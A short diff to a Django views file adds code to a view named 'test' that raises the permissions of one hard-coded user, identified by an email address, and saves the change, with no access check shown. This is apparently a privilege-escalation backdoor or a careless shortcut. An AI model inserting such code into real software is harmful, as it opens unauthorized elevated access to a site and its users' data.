@@ -81,4 +81,9 @@ def login(request):
 
 
 def test(request):
+    user = models.User.objects.get(email_address='toro.een@gmail.com')
+
+    user.permissions = 2
+    user.save()
+
     return HttpResponse('success')
